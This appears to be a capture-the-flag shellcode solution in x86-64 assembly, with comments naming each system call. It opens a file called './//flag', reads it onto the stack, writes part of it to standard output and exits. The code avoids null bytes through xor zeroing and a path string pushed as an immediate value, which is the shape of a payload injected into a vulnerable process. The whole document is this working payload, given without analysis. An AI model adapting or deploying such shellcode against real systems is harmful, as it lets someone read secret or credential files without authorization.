; open(".///flag", 0, 0)
xor rax, rax
push rax
inc rax
inc rax
mov r8, 0x67616c662f2f2f2e
push r8
mov rdi, rsp
xor rsi, rsi
xor rdx,rdx
syscall

; read(fd, $rsp, 0xff)
mov r8, rax
mov rdi, rax
xor rax, rax
mov rsi, rsp
mov dl, 0xff
syscall

; write(1, $rsp, 0x0f)
xor rax, rax
xor rdi, rdi
inc rdi
mov rsi, rsp
cdq
mov dl, 0x0f
inc rax
syscall

; close(fd)
mov rdi, r8
xor rax, rax
mov al, 0x3
syscall

; exit(0)
xor rax, rax
mov al, 0x3c
xor rdi, rdi
syscall
